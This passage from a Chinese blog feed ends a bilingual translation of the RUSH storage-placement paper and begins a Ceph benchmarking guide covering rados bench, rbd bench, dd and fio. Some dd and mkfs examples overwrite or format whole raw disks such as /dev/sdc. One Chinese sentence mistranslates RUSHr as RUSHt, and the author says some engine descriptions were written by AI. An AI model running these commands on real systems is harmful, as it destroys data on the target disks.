管理的系统中的每个子集群必须至少拥有与对象副本数量相同的磁盘数量。由于小型系统通常副本数较小，这可能会或可能不会成为障碍。然而，显然，RUSHt 是将数据分布到超大型磁盘集群的最佳算法。</p><p>RUSHp and RUSHr both provide alternatives to RUSHt for smaller systems. Since it has the greatest flexibility in configurations RUSHr may be the best option for systems which need to remove disks one at a time from the system. Because it supports erasure coding, RUSHp may be the best option for smaller systems where storage space is at a premium.</p><p>RUSHp 和 RUSHt 都为小型系统提供了 RUSHt 的替代方案。由于 RUSHr 具有最大的灵活性，对于需要逐个移除磁盘的系统，RUSHr 可能是最佳选择。由于支持擦除编码，RUSHp 可能是存储空间有限的小型系统的最佳选择。</p><p>RUSH algorithms operate well across a wide range of scalable storage systems. By providing support for replication, system growth and disk obsolescence, and totally decentralized lookup, RUSH enables the construction of highperformance, highly parallel object-based storage systems.</p><p>RUSH 算法在各种可扩展存储系统上运行良好。通过提供对复制、系统增长和磁盘淘汰的支持以及完全去中心化的查找，RUSH 能够构建高性能、高度并行的基于对象的存储系统。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>The research in this paper was supported in part by Lawrence Livermore National Laboratory, Los Alamos National Laboratory, and Sandia National Laboratory under contract B520714. We also thank the industrial sponsors of the Storage Systems Research Center, including Hewlett Packard, IBM, Intel, LSI Logic, Microsoft, ONStor, Overland Storage, and Veritas.</p><p>本文的研究部分由劳伦斯利弗莫尔国家实验室、洛斯阿拉莫斯国家实验室和桑迪亚国家实验室根据合同号 B520714 提供支持。我们还要感谢存储系统研究中心的行业赞助商，包括惠普、IBM、英特尔、LSI Logic、微软、ONStor、Overland Storage 和 Veritas。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><div><p>[1] A. Adya, W. J. Bolosky, M. Castro, R. Chaiken, G. Cermak, J. R. Douceur, J. Howell, J. R. Lorch, M. Theimer, and R. Wattenhofer. FARSITE: Federated, available, and reliable storage for an incompletely trusted environment. In Proceedings of the 5th Symposium on Operating Systems Design and Implementation (OSDI), Boston, MA, Dec. 2002. USENIX.<br>[2] Y. Breitbart, R. Vingralek, and G. Weikum. Load control in scalable distributed file structures. Distributed and Parallel Databases, 4(4):319–354, 1996.<br>[3] A. Brinkmann, K. Salzwedel, and C. Scheideler. Compact, adaptive placement schemes for non-uniform capacities. In Proceedings of the 14th ACM Symposium on Parallel Algorithms and Architectures (SPAA), pages 53–62, Winnipeg, Manitoba, Canada, Aug. 2002.<br>[4] S.-C. Chau and A. W.-C. Fu. A gracefully degradable declustered RAID architecture. Cluster Computing Journal, 5(1):97–105, 2002.<br>[5] D. M. Choy, R. Fagin, and L. Stockmeyer. Efficiently extendible mappings for balanced data distribution. Algorithmica, 16:215–232, 1996.<br>[6] F. Dabek, M. F. Kaashoek, D. Karger, R. Morris, and I. Stoica. Wide-area cooperative storage with CFS. In Proceedings of the 18th ACM Symposium on Operating Systems Principles (SOSP ‘01), pages 202–215, Banff, Canada, Oct. 2001. ACM.<br>[7] R. Devine. Design and implementation of DDH: A distributed dynamic hashing algorithm. In Proceedings of the 4th International Conference on Foundations of Data Organization and Algorithms, pages 101–114, 1993.<br>[8] A. Goel, C. Shahabi, D. S.-Y. Yao, and R. Zimmerman. SCADDAR: An efficient randomized technique to reorganize continuous media blocks. In Proceedings of the 18th International Conference on Data Engineering (ICDE ‘02), pages 473–482, Feb. 2002.<br>[9] A. Granville. On elementary proofs of the Prime Number Theorem for Arithmetic Progressions, without characters. In Proceedings of the 1993 Amalfi Conference on Analytic Number Theory, pages 157–194, Salerno, Italy, 1993.<br>[10] R. J. Honicky and E. L. Miller. A fast algorithm for online placement and reorganization of replicated data. In Proceedings of the 17th International Parallel &amp; Distributed Processing Symposium (IPDPS 2003), Nice, France, Apr. 2003.<br>[11] D. Karger, E. Lehman, T. Leighton, M. Levine, D. Lewin, and R. Panigrahy. Consistent hashing and random trees: Distributed caching protocols for relieving hot spots on the World Wide Web. In ACM Symposium on Theory of Computing, pages 654–663, May 1997.<br>[12] B. Kr¨oll and P. Widmayer. Distributing a search tree among a growing number of processors. In Proceedings of the 1994 ACM SIGMOD International Conference on Management of Data, pages 265–276. ACM Press, 1994.<br>[13] W. Litwin, M.-A. Neimat, and D. Schneider. RP*: A family of order-preserving scalable distributed data structures. In Proceedings of the 20th Conference on Very Large Databases (VLDB), pages 342–353, Santiago, Chile, 1994.<br>[14] W. Litwin, M.-A. Neimat, and D. A. Schneider. LH*—a scalable, distributed data structure. ACM Transactions on Database Systems, 21(4):480–525, 1996.<br>[15] S. Rhea, P. Eaton, D. Geels, H. Weatherspoon, B. Zhao, and J. Kubiatowicz. Pond: the OceanStore prototype. In Proceedings of the 2003 Conference on File and Storage Technologies (FAST), pages 1–14, Mar. 2003.<br>[16] M. Ripeanu, A. Iamnitchi, and I. Foster. Mapping the Gnutella network. IEEE Internet Computing, 6(1):50–57, Aug. 2002.<br>[17] A. Rowstron and P. Druschel. Storage management and caching in PAST, a large-scale, persistent peer-to-peer storage utility. In Proceedings of the 18th ACM Symposium on Operating Systems Principles (SOSP ‘01), pages 188–201, Banff, Canada, Oct. 2001. ACM.<br>[18] H. Tang and T. Yang. An efficient data location protocol for self-organizing storage clusters. In Proceedings of the 2003 ACM&#x2F;IEEE Conference on Supercomputing (SC ‘03), Phoenix, AZ, Nov. 2003.<br>[19] R. O. Weber. Information technology—SCSI object-based storage device commands (OSD). Technical Council Proposal Document T10&#x2F;1355-D, Technical Committee T10, Aug. 2002.<br>[20] C. Wu and R. Burns. Handling heterogeneity in shared-disk file systems. In Proceedings of the 2003 ACM&#x2F;IEEE Conference on Supercomputing (SC ‘03), Phoenix, AZ, Nov. 2003.<br>[21] Q. Xin, E. L. Miller, D. D. E. Long, S. A. Brandt, T. Schwarz, and W. Litwin. Reliability mechanisms for very large storage systems. In Proceedings of the 20th IEEE &#x2F; 11th NASA Goddard Conference on Mass Storage Systems and Technologies, pages 146–156, Apr. 2003.</p></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> Ceph </tag>
            
            <tag> RUSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph 集群性能测试工具详解</title>
      <link href="/2023/06/01/ceph-test/"/>
      <url>/2023/06/01/ceph-test/</url>
      
        <content type="html"><![CDATA[<p>本文详细介绍了包括 rados bench、rbd bench、dd 、fio 、vdbench 、mdtest 、iozone、cosbench、cbt 等测试工具对于 Ceph 集群的性能压测的使用。对于每个工具都提供了压测命令参数、示例命令等使用说明，实现了对 Ceph 块存储、文件存储、对象存储、rados 对象存储等存储类别的性能压测。文中重点阐述了各命令的使用格式、基本功能和参数选择，为用户在 Ceph 环境中进行性能评估提供了实用指南。</p><h1 id="一、rados-bench"><a href="#一、rados-bench" class="headerlink" title="一、rados bench"></a>一、rados bench</h1><p>以下基于 v19.2.1 版本进行测试。</p><p><strong>用途:</strong></p><ul><li>测试 ceph rados 对象存储性能；</li></ul><h2 id="1-1、测试配置参数"><a href="#1-1、测试配置参数" class="headerlink" title="1.1、测试配置参数"></a>1.1、测试配置参数</h2><p><strong>命令格式:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rados bench <span class="hljs-variable">$seconds</span> <span class="hljs-variable">$type</span> [args...]<br></code></pre></td></tr></table></figure><ul><li><code>$seconds</code> : 压测运行时间；</li><li><code>$type</code> : 压测类型，可选值为 write&#x2F;seq&#x2F;rand （分别代表写&#x2F;连续读&#x2F;随机读）；</li><li><code>-p</code> : 指定压测的目标 pool ；</li><li><code>-b</code> : 只有当压测类型为 write 时可用，用于设置写入 block 的大小，默认为 4M；</li><li><code>-O</code> : 设置写入 object 的大小，默认为 4M（与 -b 参数值相同）；</li><li><code>-t</code> : 并发数量，默认为 16 ；</li><li><code>--no-cleanup</code> : 压测数据后不清理，可用于后续测试读性能；</li><li><code>--run-name</code> : 压测任务名（压测任务元信息对象名）。当压测类型为 write 的时，在压测结果后会将压测的配置信息写入该名称的对象中；当压测类型为 seq&#x2F;rand 时或者启用了 –reuse-bench 参数，则会在压测开始前尝试读取该名称的对象中存储的压测元信息。当执行压测数据清理的时候也会尝试读取其中的压测元信息。其中压测元信息中包括 object_size&#x2F;finished&#x2F;prev_pid&#x2F;op_size。当对一个 pool 执行多个客户端并发压测的时候一定要指定不同的任务名，否则可能无法同时启动多个压测任务，或者会导致压测元信息持久化信息的异常；</li><li><code>--no-hints</code> : 默认不指定该参数；</li><li><code>--reuse-bench</code> : 默认不指定该参数；</li><li><code>--show-time</code> : 默认不指定该参数；</li><li><code>--write-object</code> : 只有当压测类型为 write 时可用，用于设置压测写入目标为 object ，默认写入目标为 object；</li><li><code>--write-omap</code> : 只有当压测类型为 write 时可用，用于设置压测写入目标为 omap；</li><li><code>--write-xattr</code> : 只有当压测类型为 write 时可用，用于设置压测写入目标为 xattr；</li></ul><h2 id="1-2、测试命令示例"><a href="#1-2、测试命令示例" class="headerlink" title="1.2、测试命令示例"></a>1.2、测试命令示例</h2><p><strong>基础命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看命令详情</span><br>rados bench --<span class="hljs-built_in">help</span><br><br><span class="hljs-comment"># 创建一个名为 tp01 的测试 pool</span><br>ceph osd pool create tp01<br><br><span class="hljs-comment"># 查看池信息</span><br>ceph osd pool get tp01 all<br><br><span class="hljs-comment"># 查看该池占用的资源</span><br>rados -p tp01 <span class="hljs-built_in">df</span><br><br><span class="hljs-comment"># 清理测试文件</span><br>rados -p tp01 cleanup<br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 压测写</span><br>rados bench 120 write -p tp01 -b 4194304 -O 4194304 -t 16 --show-time --no-cleanup<br><br><span class="hljs-comment"># 压测顺序读</span><br>rados bench 120 <span class="hljs-built_in">seq</span> -p tp01 -t 16 --show-time<br><br><span class="hljs-comment"># 压测随机读</span><br>rados bench 120 rand -p tp01 -t 16 --show-time<br><br><span class="hljs-comment"># 清理压测数据</span><br>rados cleanup -p tp01<br></code></pre></td></tr></table></figure><h1 id="二、rbd-bench"><a href="#二、rbd-bench" class="headerlink" title="二、rbd bench"></a>二、rbd bench</h1><p>以下基于 v19.2.1 版本进行测试。</p><p><strong>用途:</strong></p><ul><li>测试块存储性能；</li></ul><h2 id="2-1、测试配置参数"><a href="#2-1、测试配置参数" class="headerlink" title="2.1、测试配置参数"></a>2.1、测试配置参数</h2><p><strong>命令格式:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rbd bench [-p/--pool &lt;pool&gt;] [--namespace &lt;namespace&gt;] [--image &lt;image&gt;]<br>          [--io-size &lt;io-size&gt;] [--io-threads &lt;io-threads&gt;]<br>          [--io-total &lt;io-total&gt;] [--io-pattern &lt;io-pattern&gt;]<br>          [--rw-mix-read &lt;rw-mix-read&gt;] --io-type &lt;io-type&gt;<br>          &lt;image-spec&gt;<br></code></pre></td></tr></table></figure><ul><li><code>-p/--pool</code> : 指定压测的 pool ；</li><li><code>--namespace</code> : 指定压测的 namespace ；</li><li><code>--image</code> : 指定压测的 image ；</li><li><code>--io-size</code> : 每次操作 IO 的大小，可选值 &lt; 4G ， 默认为 4K ；</li><li><code>--io-threads</code> : 默认为 16 ；</li><li><code>--io-total</code> : 默认为 1G ；</li><li><code>--io-pattern</code> : 执行 IO 的模式，用于设置多线程情况下每个线程操作数据的起始点，可选值为 rand&#x2F;seq&#x2F;full-seq （随机的&#x2F;连续的&#x2F;完全连续的） ，默认为 seq 。rand 模式下随机设定每个线程的数据起始点。seq 模式下按照线程数量分配 image 总大小，分配给每个线程相互独立的数据范围，设置每个线程的数据起始点，实现每个线程操作自己范围内的数据。full-seq 模式下，每个线程分配的起始点为分别是 0<em>io-size , 1</em>io-size, 2*io-size 等；</li><li><code>--rw-mix-read</code> : 设置读写操作的比例，这里的值为读操作的比例，可选值 &lt;&#x3D; 100 ， 默认为 50 。 这里采用的概率范围计算方法，计算规则为每次执行压测的时候获取 0 到 100 以内的数字，如果获取的数字小于该值则执行读操作，如果获取的数字大于等于该值则执行写操作，通常由于 100 以内的每个数字出现的概率相同，所以可以按照数字的多少来划分概率；</li><li><code>--io-type</code> : 压测类型，可选值为 read&#x2F;write&#x2F;readwrite(rw) （读&#x2F;写&#x2F;读写混合）；</li><li><code>image-spec</code> :</li></ul><p><img src="/assets/images/ceph-test-rbd-bench-rand.png" alt="rand" loading="lazy"></p><p><img src="/assets/images/ceph-test-rbd-bench-seq.png" alt="seq" loading="lazy"></p><p><img src="/assets/images/ceph-test-rbd-bench-fullseq.png" alt="full-seq" loading="lazy"></p><h2 id="2-2、测试命令示例"><a href="#2-2、测试命令示例" class="headerlink" title="2.2、测试命令示例"></a>2.2、测试命令示例</h2><p><strong>基础命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看命令详情</span><br>rbd <span class="hljs-built_in">help</span> bench<br><br><span class="hljs-comment"># 创建一个名为 tp02 的 pool</span><br>ceph osd pool create tp02<br><br><span class="hljs-comment"># 初始化名为 tp02 的 pool</span><br>rbd pool init tp02<br><br><span class="hljs-comment"># 在 tp02 的 pool 中创建一个名为 img01 的 image， 并限制其大小为 50G</span><br>rbd create tp02/img01 --size 50G<br><br><span class="hljs-comment"># 映射 image 到本机</span><br>rbd map tp02/img01<br><br><span class="hljs-comment"># 列出所有的 pool</span><br>ceph osd lspools<br><br><span class="hljs-comment"># 列出 tp02 中的所有 image</span><br>rbd <span class="hljs-built_in">ls</span> -p tp02<br><br><span class="hljs-comment"># 列出所有镜像的映射信息</span><br>rbd showmapped<br><br><span class="hljs-comment"># 查看镜像信息</span><br>rbd info tp02/img01<br><br><span class="hljs-comment"># 查看镜像容量</span><br>rbd --pool tp02 --image img01 <span class="hljs-built_in">du</span><br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 随机读</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type <span class="hljs-built_in">read</span><br><br><span class="hljs-comment"># 随机写</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type write<br><br><span class="hljs-comment"># 顺序读</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type <span class="hljs-built_in">read</span><br><br><span class="hljs-comment"># 顺序写</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type write<br><br><span class="hljs-comment"># 随机比例读写: 读:80%，写:20%</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type readwrite --rw-mix-read 80<br><br><span class="hljs-comment"># 随机比例读写: 读:20%，写:80%</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern rand --io-type readwrite --rw-mix-read 20<br><br><span class="hljs-comment"># 顺序比例读写: 读:80%，写:20%</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type readwrite --rw-mix-read 80<br><br><span class="hljs-comment"># 顺序比例读写: 读:20%，写:80%</span><br>rbd bench --pool tp02 --image img01 --io-size 4K --io-threads 16 --io-total 16G --io-pattern <span class="hljs-built_in">seq</span> --io-type readwrite --rw-mix-read 20<br></code></pre></td></tr></table></figure><h1 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h1><p><strong>用途:</strong></p><ul><li>测试裸设备存储性能；</li><li>测试块存储性能；</li><li>测试文件存储性能；</li></ul><h2 id="3-1、测试配置参数"><a href="#3-1、测试配置参数" class="headerlink" title="3.1、测试配置参数"></a>3.1、测试配置参数</h2><p><strong>命令格式:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> [OPERAND]...<br></code></pre></td></tr></table></figure><ul><li><code>bs</code> : 每次操作的字节数，该值会覆盖 ibs 和 obs ， 默认为 512 ；</li><li><code>cbs</code> : 每次转换的字节数；</li><li><code>conv</code> : 根据逗号分隔的符号列表转换文件；</li><li><code>count</code> : 操作的块总数量；</li><li><code>ibs</code> : 每次读取最多的字节数，默认为 512 ；</li><li><code>if</code> : 从文件中读取，而不是从标准输入中读取；</li><li><code>iflag</code> : 读操作的 flag 列表，以逗号分隔；</li><li><code>obs</code> : 每次写入字节数，默认为 512 ；</li><li><code>of</code> : 写入到文件，而不是写入到标准输出；</li><li><code>oflag</code> : 写操作的 flag 列表，以逗号分隔 ；</li><li><code>seek</code> : 在输出开始时跳过 N 个 obs 大小的块；</li><li><code>skip</code> : 在输入开始时跳过 N 个 ibs 大小的块；</li><li><code>status</code> : 打印到标准错误的级别信息，none 仅展示错误消息， noxfer 阻止最终传输统计信息， progress 显示周期性传输统计信息；</li></ul><p><strong>命令相关的 flag 参数如下:</strong></p><ul><li><code>append</code> : 追加模式，仅对输出有意义，建议使用 conv&#x3D;notrunc ；</li><li><code>direct</code> : 使用直接 I&#x2F;O 操作数据；</li><li><code>directory</code> : 仅支持操作目录；</li><li><code>dsync</code> : 使用同步 I&#x2F;O 操作数据；</li><li><code>sync</code> : 使用同步 I&#x2F;O 操作数据，也适用于元数据；</li><li><code>fullblock</code> : 累积完整的输入块，仅限 iflag ；</li><li><code>nonblock</code> : 使用非阻塞 I&#x2F;O ；</li><li><code>noatime</code> : 不更新访问时间 ；</li><li><code>nocache</code> : 请求丢弃缓存。另见 oflag&#x3D;sync ；</li><li><code>noctty</code> : 不从文件分配控制终端 ；</li><li><code>nofollow</code> : 不跟随符号链接；</li><li><code>count_bytes</code> : 将 ‘count&#x3D;N’ 视为字节计数，仅限 iflag ；</li><li><code>skip_bytes</code> : 将 ‘skip&#x3D;N’ 视为字节计数，仅限 iflag ；</li><li><code>seek_bytes</code> : 将 ‘seek&#x3D;N’ 视为字节计数，仅限 oflag ；</li></ul><p><strong>命令相关的 conv 参数如下:</strong></p><ul><li><code>ascii</code> : 从 EBCDIC 到 ASCII ；</li><li><code>ebcdic</code> : 从 ASCII 到 EBCDIC ；</li><li><code>ibm</code> : 从 ASCII 到替代 EBCDIC ；</li><li><code>block</code> : 用空格填充以换行符结尾的记录到 cbs 大小；</li><li><code>unblock</code> : 用换行符替换 cbs 大小记录中的尾随空格；</li><li><code>lcase</code> : 将大写字母转换为小写字母；</li><li><code>ucase</code> : 将小写字母转换为大写字母；</li><li><code>sparse</code> : 尝试在输出中为 NUL 输入块进行跳过而不是写入；</li><li><code>swab</code> : 交换每对输入字节；</li><li><code>sync</code> : 用 NUL 填充每个输入块到 ibs 大小；与 block 或 unblock 一起使用时，用空格而不是 NUL 填充；</li><li><code>excl</code> : 如果输出文件已存在则失败；</li><li><code>nocreat</code> : 不创建输出文件；</li><li><code>notrunc</code> : 不截断输出文件；</li><li><code>noerror</code> : 读取错误后继续；</li><li><code>fdatasync</code> : 在完成前物理写入输出文件数据；</li><li><code>fsync</code> : 在完成前物理写入输出文件数据，也写入元数据；</li></ul><h2 id="3-2、测试命令示例"><a href="#3-2、测试命令示例" class="headerlink" title="3.2、测试命令示例"></a>3.2、测试命令示例</h2><p>通常 dd 命令可以与 time 命令结合使用，以便于获取 dd 执行的耗时信息。</p><p><strong>基础命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 sdc 盘支持的最大 I/O 块大小</span><br><span class="hljs-built_in">cat</span> /sys/block/sdc/queue/max_sectors_kb<br><br><span class="hljs-comment"># 清除缓存</span><br><span class="hljs-built_in">sync</span>; <span class="hljs-built_in">echo</span> 3 &gt; /proc/sys/vm/drop_caches<br></code></pre></td></tr></table></figure><h3 id="3-2-1、裸设备性能测试"><a href="#3-2-1、裸设备性能测试" class="headerlink" title="3.2.1、裸设备性能测试"></a>3.2.1、裸设备性能测试</h3><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 对 /dev/sdc 裸设备进行写性能测试</span><br><span class="hljs-keyword">time</span> <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/sdc bs=1M count=50000 oflag=direct status=progress<br><br><span class="hljs-comment"># 对 /dev/sdc 裸设备进行读性能测试</span><br><span class="hljs-keyword">time</span> <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sdc of=/dev/null bs=1M count=50000 iflag=direct status=progress<br></code></pre></td></tr></table></figure><h3 id="3-2-2、块存储性能测试"><a href="#3-2-2、块存储性能测试" class="headerlink" title="3.2.2、块存储性能测试"></a>3.2.2、块存储性能测试</h3><p><strong>基础命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看硬盘信息</span><br>lsblk<br><br><span class="hljs-comment"># 硬盘分区</span><br><span class="hljs-built_in">sudo</span> fdisk /dev/sdc<br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 对 /dev/sdc1 块设备进行写性能测试</span><br><span class="hljs-keyword">time</span> <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/sdc1 bs=1M count=50000 oflag=direct status=progress<br><br><span class="hljs-comment"># 对 /dev/sdc 块设备进行读性能测试</span><br><span class="hljs-keyword">time</span> <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sdc1 of=/dev/null bs=1M count=50000 iflag=direct status=progress<br></code></pre></td></tr></table></figure><h3 id="3-2-3、文件存储性能测试"><a href="#3-2-3、文件存储性能测试" class="headerlink" title="3.2.3、文件存储性能测试"></a>3.2.3、文件存储性能测试</h3><p><strong>基础命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看硬盘信息</span><br>lsblk<br><br><span class="hljs-comment"># 硬盘分区</span><br><span class="hljs-built_in">sudo</span> fdisk /dev/sdc<br><br><span class="hljs-comment"># 格式化分区</span><br>mkfs.ext4 /dev/sdc1<br><br><span class="hljs-comment"># 挂载分区</span><br><span class="hljs-built_in">mkdir</span> /mnt/data<br>mount /dev/sdc1 /mnt/data<br><br><span class="hljs-comment"># 自动挂载，可以编辑/etc/fstab 文件，添加一条挂载分区的记录</span><br>/dev/sdc1 /mnt/data ext4 defaults 0 0<br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 写性能测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/mnt/data/testfile bs=1M count=50000 oflag=direct status=progress<br><br><span class="hljs-comment"># 读性能测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/data/testfile of=/dev/null bs=1M count=50000 iflag=direct status=progress<br><br><span class="hljs-comment"># 写性能测试</span><br><span class="hljs-comment"># fdatasync 表示每次写入数据后，将数据同步到磁盘中</span><br><span class="hljs-comment"># notrunc 表示不截断输出文件</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/mnt/data/testfile bs=1M count=50000 oflag=direct conv=fdatasync,notrunc status=progress<br><br><span class="hljs-comment"># 写限速</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=100000 | pv -L 2M | <span class="hljs-built_in">dd</span> of=/mnt/data/testfile oflag=direct status=progress<br><br><span class="hljs-comment"># 读限速</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/data/testfile bs=1M count=500000 iflag=direct | pv -L 8M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br></code></pre></td></tr></table></figure><h1 id="四、fio"><a href="#四、fio" class="headerlink" title="四、fio"></a>四、fio</h1><p><strong>用途:</strong></p><ul><li>测试裸设备存储性能；</li><li>测试块存储性能；</li><li>测试文件存储性能；</li><li>测试对象存储性能；</li><li>测试 ceph rados 对象存储性能；</li></ul><p><strong>以下介绍基于 fio <a href="https://github.com/axboe/fio/tree/fio-3.40">3.40</a> 版本。</strong></p><p><strong>软件环境及安装:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装环境依赖</span><br>dnf install -y ceph-common librbd1 librbd-devel curl openssl openssl-devel<br><br><span class="hljs-comment"># 编译安装</span><br>wget https://github.com/axboe/fio/archive/refs/tags/fio-3.40.tar.gz<br>tar -zxvf fio-3.40.tar.gz<br><span class="hljs-built_in">cd</span> fio-fio-3.40<br>./configure<br>make<br>make install<br></code></pre></td></tr></table></figure><h2 id="4-1、测试配置参数"><a href="#4-1、测试配置参数" class="headerlink" title="4.1、测试配置参数"></a>4.1、测试配置参数</h2><p><strong>命令格式:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fio [options] [job options] &lt;job file(s)&gt;<br></code></pre></td></tr></table></figure><ul><li><code>--debug</code> : 启用调试日志。可选参数为一个或多个。process,file,io,mem,blktrace,verify,random,parse,diskutil,job,mutex,profile,time,net,rate,compress,steadystate,helperthread,zbd ；</li><li><code>--parse-only</code> : 仅解析选项，不启动任何 IO ；</li><li><code>--merge-blktrace-only</code> : 仅合并 blktrace，不启动任何 IO ；</li><li><code>--output</code> : 将输出写入文件；</li><li><code>--bandwidth-log</code> : 生成聚合带宽日志；</li><li><code>--minimal</code> : 最小化（简洁）输出；</li><li><code>--output-format=type</code> : 输出格式，可选值为 terse&#x2F;json&#x2F;json+&#x2F;normal ；</li><li><code>--terse-version=type</code> : 设置简洁版本输出格式，可选值为 2&#x2F;3&#x2F;4 ，默认为 3 ；</li><li><code>--cpuclock-test</code> : 执行 CPU 时钟的测试&#x2F;验证；</li><li><code>--crctest=[type]</code> : 测试校验和函数的速度；</li><li><code>--cmdhelp=cmd</code> : 打印命令帮助，all 表示所有命令；</li><li><code>--enghelp=engine</code> : 打印 ioengine 帮助，或列出可用的 ioengine ；</li><li><code>--enghelp=engine,cmd</code> : 打印 ioengine 命令的帮助；</li><li><code>--showcmd</code> : 将作业文件转换为命令行选项；</li><li><code>--eta=when</code> : 何时打印 ETA 估计，可选值为 always&#x2F;never&#x2F;auto ；</li><li><code>--eta-newline=t</code> : 每经过 t 时间强制换行；</li><li><code>--status-interval=t</code> : 每经过 t 时间强制完整状态转储；</li><li><code>--readonly</code> : 开启安全只读检查，防止写入；</li><li><code>--section=name</code> : 仅运行作业文件中指定的部分，可以指定多个部分；</li><li><code>--alloc-size=kb</code> : 将 smalloc 池设置为此大小，单位为 kb ， 默认为 16384 ；</li><li><code>--warnings-fatal</code> : fio 解析器警告为致命错误；</li><li><code>--max-jobs=nr</code> : 支持的最大线程&#x2F;进程数；</li><li><code>--server=args</code> : 启动后端 fio 服务器；</li><li><code>--daemonize=pidfile</code> : 后台运行 fio 服务器，将 pid 写入文件；</li><li><code>--client=hostname</code> : 与远程后端 fio 服务器在主机名通信；</li><li><code>--remote-config=file</code> : 告诉 fio 服务器加载此本地作业文件；</li><li><code>--idle-prof=option</code> : 报告系统或每个 CPU 的空闲情况（option&#x3D;system,percpu），或仅运行单位工作校准（option&#x3D;calibrate）；</li><li><code>--inflate-log=log</code> : 解压并输出压缩日志；</li><li><code>--trigger-file=file</code> : 当文件存在时执行触发命令；</li><li><code>--trigger-timeout=t</code> : 在此时间执行触发；</li><li><code>--trigger=cmd</code> : 将此命令设置为本地触发器；</li><li><code>--trigger-remote=cmd</code> : 将此命令设置为远程触发器；</li><li><code>--aux-path=path</code> : 使用此路径存储 fio 状态生成的文件；</li></ul><p><strong>支持的 io engines 列表:</strong> (使用 <code>fio --enghelp</code> 命令列出， 可使用 <code>fio --enghelp=$name</code> 命令列出对应 io engine 的参数，部分参数解释通过 AI 分析，请谨慎参考)</p><ul><li><code>cpuio</code> : 专门用于测试 CPU 性能的 I&#x2F;O 引擎。它不涉及任何实际的磁盘或网络 I&#x2F;O 操作，而是通过执行计算密集型任务来模拟 I&#x2F;O 负载。这种引擎通常用于评估 CPU 的处理能力和多线程性能；</li><li><code>mmap</code> : 通过内存映射文件进行 I&#x2F;O 操作。这种方法可以直接通过内存访问文件数据，适用于需要高速缓存和内存操作的测试；</li><li><code>sync</code> : 使用标准的同步 I&#x2F;O 系统调用（如 read() 和 write()）。这是最基本的 I&#x2F;O 引擎，适用于普通的磁盘 I&#x2F;O 性能测试；</li><li><code>psync</code> : 使用 POSIX 同步 I&#x2F;O 系统调用。这种引擎使用 pread() 和 pwrite()，允许进行位置指定的同步 I&#x2F;O 操作；</li><li><code>vsync</code> : 类似于 psync，但使用 vmsplice() 来进行数据传输，适用于需要高效数据移动的场景；</li><li><code>pvsync</code> : 类似于 psync，但使用 preadv() 和 pwritev() 系统调用，这些调用允许进行向量化的读写操作，即一次操作可以处理多个非连续的内存块；</li><li><code>pvsync2</code> : 这是 pvsync 的改进版本，使用更现代的 preadv2() 和 pwritev2() 系统调用，支持额外的标志和功能，如 RWF_NOWAIT，可以提高异步处理能力；</li><li><code>null</code> : 一个特殊的 I&#x2F;O 引擎，它实际上不执行任何 I&#x2F;O 操作。这可以用来测试 fio 